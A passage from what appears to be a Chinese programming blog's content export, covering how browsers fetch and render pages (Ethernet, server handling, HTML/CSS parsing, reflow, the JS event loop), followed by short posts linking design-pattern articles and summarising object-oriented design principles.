<h2 id="4-链路层：以太网协议"><a href="#4-链路层：以太网协议" class="headerlink" title="4. 链路层：以太网协议"></a>4. 链路层：以太网协议</h2><h3 id="以太网协议"><a href="#以太网协议" class="headerlink" title="以太网协议"></a>以太网协议</h3><p>&emsp;&emsp;根据以太网协议将数据分为以“帧”为单位的数据包，每一帧分为两个部分：</p>
<ul>
<li>标头：数据包的发送者、接受者、数据类型</li>
<li>数据：数据包具体内容</li>
</ul>
<h3 id="Mac-地址"><a href="#Mac-地址" class="headerlink" title="Mac 地址"></a>Mac 地址</h3><p>&emsp;&emsp;以太网规定了连入网络的所有设备都必须具备“网卡”接口，数据包都是从一块网卡传递到另一块网卡，网卡的地址就是 Mac 地址。每一个 Mac 地址都是独一无二的，具备了一对一的能力。</p>
<h3 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h3><p>&emsp;&emsp;发送数据的方法很原始，直接把数据通过 ARP 协议，向本网络的所有机器发送，接收方根据标头信息与自身 Mac 地址比较，一致就接受，否则丢弃。<br>&emsp;&emsp;<strong>注意</strong>：接收方回应是单播。</p>
<blockquote>
<p>相关知识点：<br>&emsp;&emsp;ARP 攻击</p>
</blockquote>
<h2 id="服务器接受请求"><a href="#服务器接受请求" class="headerlink" title="服务器接受请求"></a>服务器接受请求</h2><p>&emsp;&emsp;接受过程就是把以上步骤逆转过来，参见上图。</p>
<h1 id="四、服务器处理请求"><a href="#四、服务器处理请求" class="headerlink" title="四、服务器处理请求"></a>四、服务器处理请求</h1><h2 id="大致流程-1"><a href="#大致流程-1" class="headerlink" title="大致流程"></a>大致流程</h2><figure class="image-box">
                <img src="服务器处理请求.png" alt title class>
                <p></p>
            </figure>
<h2 id="HTTPD"><a href="#HTTPD" class="headerlink" title="HTTPD"></a>HTTPD</h2><p>&emsp;&emsp;最常见的 HTTPD 有 Linux 上常用的 Apache 和 Nginx，以及 Windows 上的 IIS。<br>&emsp;&emsp;它会监听得到的请求，然后开启一个子进程去处理这个请求。</p>
<h2 id="处理请求"><a href="#处理请求" class="headerlink" title="处理请求"></a>处理请求</h2><p>&emsp;&emsp;接受 TCP 报文后，会对连接进行处理，对HTTP协议进行解析（请求方法、域名、路径等），并且进行一些验证：</p>
<ul>
<li>验证是否配置虚拟主机</li>
<li>验证虚拟主机是否接受此方法</li>
<li>验证该用户可以使用该方法（根据 IP 地址、身份信息等）</li>
</ul>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>&emsp;&emsp;假如服务器配置了 HTTP 重定向，就会返回一个<code>301</code>永久重定向响应，浏览器就会根据响应，重新发送 HTTP 请求（重新执行上面的过程）。</p>
<blockquote>
<p>关于更多：<a href="https://www.cnblogs.com/workest/p/3891321.html" target="_blank" rel="noopener">详见这篇文章</a></p>
</blockquote>
<h2 id="URL-重写"><a href="#URL-重写" class="headerlink" title="URL 重写"></a>URL 重写</h2><p>&emsp;&emsp;然后会查看 URL 重写规则，如果请求的文件是真实存在的，比如图片、html、css、js文件等，则会直接把这个文件返回。<br>&emsp;&emsp;否则服务器会按照规则把请求重写到 一个 REST 风格的 URL 上。<br>&emsp;&emsp;然后根据动态语言的脚本，来决定调用什么类型的动态文件解释器来处理这个请求。<br>&emsp;&emsp;以 PHP 语言的 MVC 框架举例，它首先会初始化一些环境的参数，根据 URL 由上到下地去匹配路由，然后让路由所定义的方法去处理请求。</p>
<h1 id="五、浏览器接受响应"><a href="#五、浏览器接受响应" class="headerlink" title="五、浏览器接受响应"></a>五、浏览器接受响应</h1><p>&emsp;&emsp;浏览器接收到来自服务器的响应资源后，会对资源进行分析。<br>&emsp;&emsp;首先查看 Response header，根据不同状态码做不同的事（比如上面提到的重定向）。<br>&emsp;&emsp;如果响应资源进行了压缩（比如 gzip），还需要进行解压。<br>&emsp;&emsp;然后，对响应资源做缓存。<br>&emsp;&emsp;接下来，根据响应资源里的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types" target="_blank" rel="noopener">MIME</a> 类型去解析响应内容（比如 HTML、Image各有不同的解析方式）。</p>
<h1 id="六、渲染页面"><a href="#六、渲染页面" class="headerlink" title="六、渲染页面"></a>六、渲染页面</h1><h3 id="浏览器内核"><a href="#浏览器内核" class="headerlink" title="浏览器内核"></a>浏览器内核</h3><figure class="image-box">
                <img src="浏览器内核.png" alt title class>
                <p></p>
            </figure>  
<p>&emsp;&emsp;不同的浏览器内核，渲染过程也不完全相同，但大致流程都差不多。</p>
<h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><figure class="image-box">
                <img src="渲染页面.png" alt title class>
                <p></p>
            </figure>
<h2 id="1-HTML-解析"><a href="#1-HTML-解析" class="headerlink" title="1. HTML 解析"></a>1. HTML 解析</h2><p>&emsp;&emsp;首先要知道浏览器解析是从上往下一行一行地解析的。  </p>
<p>解析的过程可以分为四个步骤：</p>
<h3 id="1-解码（encoding）"><a href="#1-解码（encoding）" class="headerlink" title="1. 解码（encoding）"></a>1. 解码（encoding）</h3><p>&emsp;&emsp;传输回来的其实都是一些二进制字节数据，浏览器需要根据文件指定编码（例如UTF-8）转换成字符串，也就是HTML 代码。</p>
<h3 id="2-预解析（pre-parsing）"><a href="#2-预解析（pre-parsing）" class="headerlink" title="2. 预解析（pre-parsing）"></a>2. 预解析（pre-parsing）</h3><p>&emsp;&emsp;预解析做的事情是提前加载资源，减少处理时间，它会识别一些会请求资源的属性，比如<code>img</code>标签的<code>src</code>属性，并将这个请求加到请求队列中。</p>
<h3 id="3-符号化（Tokenization）"><a href="#3-符号化（Tokenization）" class="headerlink" title="3. 符号化（Tokenization）"></a>3. 符号化（Tokenization）</h3><p>&emsp;&emsp;符号化是词法分析的过程，将输入解析成符号，HTML 符号包括，开始标签、结束标签、属性名和属性值。<br>它通过一个状态机去识别符号的状态，比如遇到<code>&lt;</code>，<code>&gt;</code>状态都会产生变化。</p>
<h3 id="4-构建树（tree-construction）"><a href="#4-构建树（tree-construction）" class="headerlink" title="4. 构建树（tree construction）"></a>4. 构建树（tree construction）</h3><blockquote>
<p>注意：符号化和构建树是并行操作的，也就是说只要解析到一个开始标签，就会创建一个 DOM 节点。</p>
</blockquote>
<p>&emsp;&emsp;在上一步符号化中，解析器获得这些标记，然后以合适的方法创建<code>DOM</code>对象并把这些符号插入到<code>DOM</code>对象中。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Web page parsing<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Web page parsing<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is an example Web page.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="构建树.png" alt title class>
                <p></p>
            </figure>
<h3 id="浏览器容错进制"><a href="#浏览器容错进制" class="headerlink" title="浏览器容错进制"></a>浏览器容错进制</h3><p>&emsp;&emsp;你从来没有在浏览器看过类似”语法无效”的错误，这是因为浏览器去纠正错误的语法，然后继续工作。</p>
<h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>&emsp;&emsp;当整个解析的过程完成以后，浏览器会通过<code>DOMContentLoaded</code>事件来通知<code>DOM</code>解析完成。</p>
<h2 id="2-CSS-解析"><a href="#2-CSS-解析" class="headerlink" title="2. CSS 解析"></a>2. CSS 解析</h2><p>&emsp;&emsp;一旦浏览器下载了 CSS，CSS 解析器就会处理它遇到的任何 CSS，根据<a href="https://drafts.csswg.org/css-syntax-3/" target="_blank" rel="noopener">语法规范</a>解析出所有的 CSS 并进行标记化，然后我们得到一个规则表。</p>
<h3 id="CSS-匹配规则"><a href="#CSS-匹配规则" class="headerlink" title="CSS 匹配规则"></a>CSS 匹配规则</h3><p>&emsp;&emsp;在匹配一个节点对应的 CSS 规则时，是按照从右到左的顺序的，例如：<code>div p { font-size :14px }</code>会先寻找所有的<code>p</code>标签然后判断它的父元素是否为<code>div</code>。<br>&emsp;&emsp;所以我们写 CSS 时，尽量用 id 和 class，千万不要过度层叠。</p>
<h2 id="3-渲染树"><a href="#3-渲染树" class="headerlink" title="3. 渲染树"></a>3. 渲染树</h2><p>&emsp;&emsp;其实这就是一个 DOM 树和 CSS 规则树合并的过程。</p>
<blockquote>
<p>注意：渲染树会忽略那些不需要渲染的节点，比如设置了<code>display:none</code>的节点。</p>
</blockquote>
<h3 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h3><p>&emsp;&emsp;通过计算让任何尺寸值都减少到三个可能之一：<code>auto</code>、百分比、px，比如把<code>rem</code>转化为<code>px</code>。</p>
<h3 id="级联"><a href="#级联" class="headerlink" title="级联"></a>级联</h3><p>&emsp;&emsp;浏览器需要一种方法来确定哪些样式才真正需要应用到对应元素，所以它使用一个叫做<code>specificity</code>的公式，这个公式会通过：</p>
<ol>
<li>标签名、class、id</li>
<li>是否内联样式</li>
<li><code>!important</code> </li>
</ol>
<p>&emsp;&emsp;然后得出一个权重值，取最高的那个。</p>
<h3 id="渲染阻塞"><a href="#渲染阻塞" class="headerlink" title="渲染阻塞"></a>渲染阻塞</h3><p>&emsp;&emsp;当遇到一个<code>script</code>标签时，DOM 构建会被暂停，直至脚本完成执行，然后继续构建 DOM 树。<br>&emsp;&emsp;但如果 JS 依赖 CSS 样式，而它还没有被下载和构建时，浏览器就会延迟脚本执行，直至 CSS Rules 被构建。  </p>
<p>&emsp;&emsp;所以我们知道：</p>
<ul>
<li>CSS 会阻塞 JS 执行</li>
<li>JS 会阻塞后面的 DOM 解析</li>
</ul>
<p>&emsp;&emsp;为了避免这种情况，应该以下原则：</p>
<ul>
<li>CSS 资源排在 JavaScript 资源前面</li>
<li>JS 放在 HTML 最底部，也就是 <code>&lt;/body&gt;</code>前</li>
</ul>
<p>&emsp;&emsp;另外，如果要改变阻塞模式，可以使用 defer 与 async，详见：<a href="https://github.com/xiaoyu2er/blog/issues/8" target="_blank" rel="noopener">这篇文章</a></p>
<h2 id="4-布局与绘制"><a href="#4-布局与绘制" class="headerlink" title="4. 布局与绘制"></a>4. 布局与绘制</h2><p>&emsp;&emsp;确定渲染树种所有节点的几何属性，比如：位置、大小等等，最后输入一个盒子模型，它能精准地捕获到每个元素在屏幕内的准确位置与大小。<br>&emsp;&emsp;然后遍历渲染树，调用渲染器的 paint() 方法在屏幕上显示其内容。</p>
<h2 id="5-合并渲染层"><a href="#5-合并渲染层" class="headerlink" title="5. 合并渲染层"></a>5. 合并渲染层</h2><p>&emsp;&emsp;把以上绘制的所有图片合并，最终输出一张图片。</p>
<h2 id="6-回流与重绘"><a href="#6-回流与重绘" class="headerlink" title="6. 回流与重绘"></a>6. 回流与重绘</h2><h3 id="回流-reflow"><a href="#回流-reflow" class="headerlink" title="回流(reflow)"></a>回流(reflow)</h3><p>&emsp;&emsp;当浏览器发现某个部分发现变化影响了布局时，需要倒回去重新渲染，会从html标签开始递归往下，重新计算位置和大小。<br>&emsp;&emsp;reflow基本是无法避免的，因为当你滑动一下鼠标、resize 窗口，页面就会产生变化。</p>
<h3 id="重绘-repaint"><a href="#重绘-repaint" class="headerlink" title="重绘(repaint)"></a>重绘(repaint)</h3><p>&emsp;&emsp;改变了某个元素的背景色、文字颜色等等不会影响周围元素的位置变化时，就会发生重绘。<br>&emsp;&emsp;每次重绘后，浏览器还需要合并渲染层并输出到屏幕上。<br>&emsp;&emsp;回流的成本要比重绘高很多，所以我们应该尽量避免产生回流。  </p>
<p>&emsp;&emsp;比如：</p>
<ul>
<li><code>display:none</code> 会触发回流，而 <code>visibility:hidden</code> 只会触发重绘。</li>
</ul>
<h2 id="7-JavaScript-编译执行"><a href="#7-JavaScript-编译执行" class="headerlink" title="7. JavaScript 编译执行"></a>7. JavaScript 编译执行</h2><h3 id="大致流程-2"><a href="#大致流程-2" class="headerlink" title="大致流程"></a>大致流程</h3><figure class="image-box">
                <img src="JavaScript编译运行.png" alt title class>
                <p></p>
            </figure>  

<p>可以分为三个阶段：</p>
<h3 id="1-词法分析"><a href="#1-词法分析" class="headerlink" title="1. 词法分析"></a>1. 词法分析</h3><p>&emsp;&emsp;JS 脚本加载完毕后，会首先进入语法分析阶段，它首先会分析代码块的语法是否正确，不正确则抛出“语法错误”，停止执行。  </p>
<p>&emsp;&emsp;几个步骤：</p>
<ul>
<li>分词，例如将<code>var a = 2</code>，分成<code>var</code>、<code>a</code>、<code>=</code>、<code>2</code>这样的词法单元。</li>
<li>解析，将词法单元转换成抽象语法树（AST）。</li>
<li>代码生成，将抽象语法树转换成机器指令。</li>
</ul>
<h3 id="2-预编译"><a href="#2-预编译" class="headerlink" title="2. 预编译"></a>2. 预编译</h3><p>&emsp;&emsp;JS 有三种运行环境：</p>
<ul>
<li>全局环境</li>
<li>函数环境</li>
<li>eval</li>
</ul>
<p>&emsp;&emsp;每进入一个不同的运行环境都会创建一个对应的执行上下文，根据不同的上下文环境，形成一个函数调用栈，栈底永远是全局执行上下文，栈顶则永远是当前执行上下文。</p>
<h4 id="创建执行上下文"><a href="#创建执行上下文" class="headerlink" title="创建执行上下文"></a>创建执行上下文</h4><p>&emsp;&emsp;创建执行上下文的过程中，主要做了以下三件事：</p>
<ul>
<li>创建变量对象<ul>
<li>参数、函数、变量</li>
</ul>
</li>
<li>建立作用域链<ul>
<li>确认当前执行环境是否能访问变量</li>
</ul>
</li>
<li>确定 This 指向</li>
</ul>
<h3 id="3-执行"><a href="#3-执行" class="headerlink" title="3. 执行"></a>3. 执行</h3><h4 id="JS-线程"><a href="#JS-线程" class="headerlink" title="JS 线程"></a>JS 线程</h4><figure class="image-box">
                <img src="JS线程.png" alt title class>
                <p></p>
            </figure>  
<p>&emsp;&emsp;虽然 JS 是单线程的，但实际上参与工作的线程一共有四个：</p>
<blockquote>
<p>其中三个只是协助，只有 JS 引擎线程是真正执行的</p>
</blockquote>
<ul>
<li>JS 引擎线程：也叫 JS 内核，负责解析执行 JS 脚本程序的主线程，例如 V8 引擎</li>
<li>事件触发线程：属于浏览器内核线程，主要用于控制事件，例如鼠标、键盘等，当事件被触发时，就会把事件的处理函数推进事件队列，等待 JS 引擎线程执行</li>
<li>定时器触发线程：主要控制<code>setInterval</code>和<code>setTimeout</code>，用来计时，计时完毕后，则把定时器的处理函数推进事件队列中，等待 JS 引擎线程。</li>
<li>HTTP 异步请求线程：通过XMLHttpRequest连接后，通过浏览器新开的一个线程，监控readyState状态变更时，如果设置了该状态的回调函数，则将该状态的处理函数推进事件队列中，等待JS引擎线程执行。</li>
</ul>
<p>&emsp;&emsp;<strong>注：浏览器对同一域名的并发连接数是有限的，通常为 6 个。</strong></p>
<h4 id="宏任务"><a href="#宏任务" class="headerlink" title="宏任务"></a>宏任务</h4><p>&emsp;&emsp;分为：</p>
<ul>
<li>同步任务：按照顺序执行，只有前一个任务完成后，才能执行后一个任务</li>
<li>异步任务：不直接执行，只有满足触发条件时，相关的线程将该异步任务推进任务队列中，等待JS引擎主线程上的任务执行完毕时才开始执行，例如异步Ajax、DOM事件，setTimeout等。</li>
</ul>
<h4 id="微任务"><a href="#微任务" class="headerlink" title="微任务"></a>微任务</h4><p>&emsp;&emsp;微任务是ES6和Node环境下的，主要 API 有：<code>Promise</code>，<code>process.nextTick</code>。<br>&emsp;&emsp;微任务的执行在宏任务的同步任务之后，在异步任务之前。<br><img src="%E5%BE%AE%E4%BB%BB%E5%8A%A1.png" alt=" ">  </p>
<h4 id="代码例子"><a href="#代码例子" class="headerlink" title="代码例子"></a>代码例子</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'1'</span>); <span class="comment">// 宏任务 同步</span></span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'2'</span>); <span class="comment">// 宏任务 异步</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'3'</span>); <span class="comment">// 宏任务 同步</span></span><br><span class="line">    resolve();</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'4'</span>) <span class="comment">// 微任务</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'5'</span>) <span class="comment">// 宏任务 同步</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;以上代码输出顺序为：1,3,5,4,2</p>
<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ul>
<li><a href="https://github.com/skyline75489/what-happens-when-zh_CN" target="_blank" rel="noopener">what-happens-when-zh_CN</a></li>
<li><a href="https://alistapart.com/article/tags-to-dom/" target="_blank" rel="noopener">Tags to DOM</a></li>
<li><a href="https://heyingye.github.io/2018/04/16/%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">彻底理解浏览器的缓存机制</a></li>
<li><a href="https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#The_rendering_engine" target="_blank" rel="noopener">浏览器的工作原理：新式网络浏览器幕后揭秘</a></li>
<li><a href="https://blog.fundebug.com/2019/01/03/understand-browser-rendering/" target="_blank" rel="noopener">深入浅出浏览器渲染原理</a></li>
<li><a href="https://heyingye.github.io/2018/03/19/js%E5%BC%95%E6%93%8E%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89/#%E9%A2%84%E7%BC%96%E8%AF%91%E9%98%B6%E6%AE%B5" target="_blank" rel="noopener">js引擎的执行过程（一）</a></li>
<li>还有一些找不到了。。。。。</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[行为型(Behavioral) 设计模式]]></title>
      <url>/2019/09/05/BehavioralDesignPatterns/</url>
      <content type="html"><![CDATA[<blockquote>
<p>模板方法模式(Template Method) <a href="http://www.cnblogs.com/zhili/p/TemplateMethodPattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/TemplateMethodPattern.html</a><br>命令模式(Command) <a href="http://www.cnblogs.com/zhili/p/CommandPattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/CommandPattern.html</a><br>迭代器模式(Iterator) <a href="http://www.cnblogs.com/zhili/p/IteratorPattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/IteratorPattern.html</a><br>观察者模式(Observer) <a href="http://www.cnblogs.com/zhili/p/ObserverPattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/ObserverPattern.html</a><br>中介者模式(Mediator) <a href="http://www.cnblogs.com/zhili/p/MediatorPattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/MediatorPattern.html</a><br>状态者模式(State) <a href="http://www.cnblogs.com/zhili/p/StatePattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/StatePattern.html</a><br>策略者模式(Strategy) <a href="http://www.cnblogs.com/zhili/p/StragetyPattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/StragetyPattern.html</a><br>责任链模式(Chain of Responsibiliy) <a href="http://www.cnblogs.com/zhili/p/ChainOfResponsibity.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/ChainOfResponsibity.html</a><br>访问者模式(Visitor) <a href="http://www.cnblogs.com/zhili/p/VistorPattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/VistorPattern.html</a><br>备忘录模式(Memento) <a href="http://www.cnblogs.com/zhili/p/MementoPattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/MementoPattern.html</a><br>解释器模式(Interpreter)<br>空对象模式(Null Object)   </p>
</blockquote>
<a id="more"></a>

]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序设计 </tag>
            
            <tag> CSharp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[结构型(Structural) 设计模式]]></title>
      <url>/2019/09/05/StructuralDesignPatterns/</url>
      <content type="html"><![CDATA[<blockquote>
<p>适配器模式(Adapter) <a href="http://www.cnblogs.com/zhili/p/AdapterPattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/AdapterPattern.html</a><br>桥接模式(Bridge) <a href="http://www.cnblogs.com/zhili/p/BridgePattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/BridgePattern.html</a><br>装饰者模式(Decorator) <a href="http://www.cnblogs.com/zhili/p/DecoratorPattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/DecoratorPattern.html</a><br>组合模式(Composite) <a href="http://www.cnblogs.com/zhili/p/CompositePattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/CompositePattern.html</a><br>外观模式(Facade) <a href="http://www.cnblogs.com/zhili/p/FacadePattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/FacadePattern.html</a><br>亨元模式(Flyweight) <a href="http://www.cnblogs.com/zhili/p/FlyweightPattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/FlyweightPattern.html</a><br>代理模式(Proxy) <a href="http://www.cnblogs.com/zhili/p/ProxyPattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/ProxyPattern.html</a><br>私有类数据模式(Private Class Data)   </p>
</blockquote>
<a id="more"></a>

]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序设计 </tag>
            
            <tag> CSharp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[创建型(Creational) 设计模式]]></title>
      <url>/2019/09/05/CreationalDesignPatterns/</url>
      <content type="html"><![CDATA[<blockquote>
<p>单例模式(Singleton) <a href="http://www.cnblogs.com/zhili/p/SingletonPatterm.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/SingletonPatterm.html</a><br>简单工厂模式(Factory) <a href="http://www.cnblogs.com/zhili/p/SimpleFactory.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/SimpleFactory.html</a><br>工厂方法模式(Factory Method) <a href="http://www.cnblogs.com/zhili/p/FactoryMethod.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/FactoryMethod.html</a><br>抽象工厂模式(Abstract Factory) <a href="http://www.cnblogs.com/zhili/p/AbstractFactory.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/AbstractFactory.html</a><br>建造者模式(Builder) <a href="http://www.cnblogs.com/zhili/p/BuilderPattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/BuilderPattern.html</a><br>原型模式(Prototype) <a href="http://www.cnblogs.com/zhili/p/PrototypePattern.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhili/p/PrototypePattern.html</a><br>对象池模式(Object Pool)   </p>
</blockquote>
<a id="more"></a>

]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序设计 </tag>
            
            <tag> CSharp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[设计原则]]></title>
      <url>/2019/09/03/DesignPrinciples/</url>
      <content type="html"><![CDATA[<blockquote>
<p>简介：<a href="https://www.cnblogs.com/zhili/p/DesignPatternSummery.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhili/p/DesignPatternSummery.html</a><br>第一篇：<a href="https://www.cnblogs.com/shoshana-kong/p/8847893.html" target="_blank" rel="noopener">https://www.cnblogs.com/shoshana-kong/p/8847893.html</a><br>第二篇：<a href="https://www.cnblogs.com/www-zsl187-com/p/8821885.html" target="_blank" rel="noopener">https://www.cnblogs.com/www-zsl187-com/p/8821885.html</a>  </p>
</blockquote>
<p>1、开放 - 封闭原则 ( Open-Closed Principle, OCP )<br>&emsp;&emsp;通俗：对扩展开放，对修改关闭<br>&emsp;&emsp;开闭原则（Open-Closed Principle, OCP）强调的是：一个软件实体（指的类、函数、模块等）应该对扩展开放，对修改关闭。即每次发生变化时，要通过添加新的代码来增强现有类型的行为，而不是修改原有的代码。<br>&emsp;&emsp;符合开闭原则的最好方式是提供一个固有的接口，然后让所有可能发生变化的类实现该接口，让固定的接口与相关对象进行交互。  </p>
<p>2、单一职责原则 ( Single Responsibility Principle )<br>&emsp;&emsp;通俗：一个类只做一件事<br>&emsp;&emsp;就一个类而言，应该只有一个引起它变化的原因。如果一个类承担的职责过多，就等于把这些职责耦合在一起，一个职责的变化可能会影响到其他的职责，另外，把多个职责耦合在一起，也会影响复用性。  </p>
<p>3、里氏替换原则 ( Liskov Substitution Principle )<br>&emsp;&emsp;通俗：子类不能去修改父类的功能<br>&emsp;&emsp;里氏代替原则（Liskov Substitution Principle, LSP）指的是子类必须替换掉它们的父类型。也就是说，在软件开发过程中，子类替换父类后，程序的行为是一样的。只有当子类替换掉父类后，此时软件的功能不受影响时，父类才能真正地被复用，而子类也可以在父类的基础上添加新的行为。  </p>
<p>4、迪米特法则 / 最少知识原则 ( Law Of Demeter )<br>&emsp;&emsp;通俗：高内聚，低耦合<br>&emsp;&emsp;迪米特法则（Law of Demeter，LoD）又叫最少知识原则（Least Knowledge Principle，LKP），指的是一个对象应当对其他对象有尽可能少的了解。也就是说，一个模块或对象应尽量少的与其他实体之间发生相互作用，使得系统功能模块相对独立，这样当一个模块修改时，影响的模块就会越少，扩展起来更加容易。<br>&emsp;&emsp;关于迪米特法则其他的一些表述有：只与你直接的朋友们通信；不要跟“陌生人”说话。  </p>
<p>5、依赖倒置原则 ( Dependence Inversion Principle )<br>&emsp;&emsp;通俗：类似 IOC，采用接口编程<br>&emsp;&emsp;依赖倒置（Dependence Inversion Principle, DIP）原则指的是抽象不应该依赖于细节，细节应该依赖于抽象，也就是提出的 “面向接口编程，而不是面向实现编程”。这样可以降低客户与具体实现的耦合。  </p>
<p>6、接口隔离原则 ( Interface Segregation Principle )<br>&emsp;&emsp;通俗：细节接口<br>&emsp;&emsp;接口隔离原则（Interface Segregation Principle, ISP）指的是使用多个专门的接口比使用单一的总接口要好。也就是说不要让一个单一的接口承担过多的职责，而应把每个职责分离到多个专门的接口中，进行接口分离。过于臃肿的接口是对接口的一种污染。  </p>
<p>7、合成 / 聚合原则 ( Composite / Aggregate Reuse Principle, CARP )<br>&emsp;&emsp;通俗：避免使用继承<br>&emsp;&emsp;合成复用原则（Composite Reuse Principle, CRP）就是在一个新的对象里面使用一些已有的对象，使之成为新对象的一部分。新对象通过向这些对象的委派达到复用已用功能的目的。简单地说，就是要尽量使用合成/聚合，尽量不要使用继承。  </p>
<a id="more"></a>

<h1 id="第一篇"><a href="#第一篇" class="headerlink" title="第一篇"></a>第一篇</h1><p>&emsp;&emsp;开放-封闭原则具有理想主义的色彩，他是面向对象设计的终极目标。其他几条则可以看做是开放-封闭原则的实现方法。设计模式就是实现了这些原则，从而达到了代码复用，增加可维护性的目的。  </p>
